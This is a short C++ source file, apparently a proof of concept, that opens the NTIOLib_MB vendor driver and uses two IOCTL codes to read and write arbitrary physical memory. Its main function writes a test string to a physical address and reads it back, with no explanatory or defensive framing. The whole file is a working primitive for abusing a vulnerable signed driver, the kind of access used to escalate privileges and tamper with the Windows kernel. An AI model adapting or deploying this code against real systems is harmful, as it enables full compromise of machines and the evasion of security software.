#include <windows.h>
#include <iostream>
#include <stdbool.h>

#define IOCTL_READ  0xC3506104
#define IOCTL_WRITE 0xC350A108

typedef unsigned __int64 QWORD;

// chunkSize must be one of {1, 2, 4} (bytes)
BOOL readPhysicalMemory(HANDLE device, PVOID physicalAddress, DWORD chunkSize, DWORD amountOfChunks, PVOID outputBuffer) {
    BYTE* inputBuffer = (BYTE*)malloc(16);

    memmove(inputBuffer, &physicalAddress, sizeof(QWORD));
    memmove(inputBuffer + 8, &chunkSize, sizeof(DWORD));
    memmove(inputBuffer + 12, &amountOfChunks, sizeof(DWORD));

    return DeviceIoControl(device, IOCTL_READ, inputBuffer, 16, outputBuffer, chunkSize * amountOfChunks, NULL, NULL);
}

// chunkSize must be one of {1, 2, 4} (bytes)
BOOL writePhysicalMemory(HANDLE device, PVOID physicalAddress, DWORD chunkSize, DWORD amountOfChunks, PVOID bufferToWrite) {
    int amountBytesToWrite = chunkSize * amountOfChunks;

    BYTE* inputBuffer = (BYTE*)malloc(16 + amountBytesToWrite);

    memmove(inputBuffer, &physicalAddress, sizeof(QWORD));
    memmove(inputBuffer + 8, &chunkSize, sizeof(DWORD));
    memmove(inputBuffer + 12, &amountOfChunks, sizeof(DWORD));
    memmove(inputBuffer + 16, bufferToWrite, amountBytesToWrite);


    return DeviceIoControl(device, IOCTL_WRITE, inputBuffer, 16 + amountBytesToWrite, NULL, NULL, NULL, NULL);
}


int main() {

    HANDLE device = CreateFileW(L"\\\\.\\NTIOLib_MB", GENERIC_READ | GENERIC_WRITE, NULL, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    
    BYTE buffer[16] = "Alon";

    if (writePhysicalMemory(device, (PVOID)0x1234, 1, 4, buffer)) {
        printf("writing succeeded\n");
    }

    if (readPhysicalMemory(device, (PVOID)0x1234, 1, 16, buffer)) {

        for (BYTE b : buffer) {
            printf("%02X ", b);
        }
    }

}